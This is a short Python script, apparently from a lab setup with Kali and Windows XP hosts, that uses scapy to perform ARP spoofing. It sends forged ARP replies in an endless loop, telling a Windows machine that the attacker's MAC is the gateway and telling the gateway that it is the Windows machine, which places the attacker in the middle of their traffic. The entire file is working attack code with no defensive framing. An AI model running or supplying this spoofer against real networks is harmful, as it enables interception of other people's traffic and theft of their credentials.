import time
import threading
from scapy.all import *

KALI_MAC = '00:00:00:00:00:04'
GATEWAY_MAC = '00:00:00:00:00:03'
GATEWAY_IP = '10.10.111.1'
WINDOWS_MAC = '00:00:00:00:00:05'
WINDOWS_IP = '10.10.111.101'

# make windows believe that kali is the gateway
def to_windows():

    # form arp reply packet
    ether = Ether(src=KALI_MAC, dst=WINDOWS_MAC)
    arp = ARP(hwsrc=KALI_MAC, psrc=GATEWAY_IP, hwdst=WINDOWS_MAC, pdst=WINDOWS_IP, op=2)
    packet = ether/arp

    sendp(packet, verbose=0)
    
# make external router believe that kali is windows xp
def to_gateway():

    # form arp reply packet
    ether = Ether(src=KALI_MAC, dst=GATEWAY_MAC)
    arp = ARP(hwsrc=KALI_MAC, psrc=WINDOWS_IP, hwdst=GATEWAY_MAC, pdst=GATEWAY_IP, op=2)
    packet = ether/arp

    sendp(packet, verbose=0)

# start attacking
def main():

    while True:
        windows = threading.Thread(target=to_windows)
        gateway = threading.Thread(target=to_gateway)
        windows.start()
        windows.join()
        print('Spoofing windows...')
        gateway.start()
        gateway.join()
        print('Spoofing external router...')
        time.sleep(1)

if __name__ == '__main__':
    main()
